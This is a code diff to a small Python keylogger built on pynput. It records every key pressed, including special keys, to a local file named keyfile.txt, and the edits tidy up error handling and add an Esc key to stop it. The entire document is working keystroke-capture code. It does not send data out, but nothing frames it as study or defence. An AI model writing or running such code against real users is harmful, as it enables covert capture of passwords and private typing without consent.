@@ -2,15 +2,21 @@ from pynput import keyboard
 
 def keyPressed(key):
     print(str(key))
-    with open("keyfile.txt", 'a') as logKey:
-        try:
-            char = key.char
-            logKey.write(char)
-        except:
-            print("Error getting char!")
+    try:
+        with open("keyfile.txt", 'a', encoding='utf-8') as logKey:
+            try:
+                logKey.write(key.char)
+            except AttributeError:
+                logKey.write(f'[{key}] ')
+    except IOError as e:
+            print(f"File Error: {e}")
 
+    if key == keyboard.Key.esc:
+        return False
 
 if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=keyPressed)
-    listener.start()
-    input()
+    try:
+        with keyboard.Listener(on_press=keyPressed) as listener:
+             listener.join()
+    except:
+         print("Key logger stopped by user.")
